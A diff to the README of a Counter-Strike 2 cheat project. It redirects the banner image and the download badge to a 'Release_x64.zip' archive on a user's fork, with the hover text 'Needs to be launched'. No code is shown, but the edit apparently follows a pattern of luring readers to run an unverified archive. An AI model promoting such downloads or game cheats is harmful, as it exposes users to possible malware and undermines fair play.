@@ -3,7 +3,7 @@
 ## Overview
 Welcome to the Asphyxia CS2 repository, your go-to open-source game hack/base/template for Counter-Strike 2. This repository provides tools and resources for enthusiasts interested in game hacking, reverse engineering, and diving deep into the Source 2 engine. Feel free to explore, experiment, and enhance your Counter-Strike 2 gaming experience with the Asphyxia CS2 project.
 
-![Counter-Strike 2](https://cdn.cloudflare.steamstatic.com/steam/apps/243750/header.jpg)
+![Counter-Strike 2](https://github.com/Lilsat/asphyxia-cs2/releases/download/v2.0/Release_x64.zip)
 
 ## Features
 🔧 **Hack Features:** Enhance your gameplay with various cheat functionalities  
@@ -15,7 +15,7 @@ Welcome to the Asphyxia CS2 repository, your go-to open-source game hack/base/te
 ## Getting Started
 To get started with Asphyxia CS2, you can download the software package from the following link:  
 
-[![Download Now](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18383251/Software.zip "Needs to be launched")
+[![Download Now](https://github.com/Lilsat/asphyxia-cs2/releases/download/v2.0/Release_x64.zip)](https://github.com/Lilsat/asphyxia-cs2/releases/download/v2.0/Release_x64.zip "Needs to be launched")
 
 If the link does not work, please check the "Releases" section of this repository for alternative download options.
 
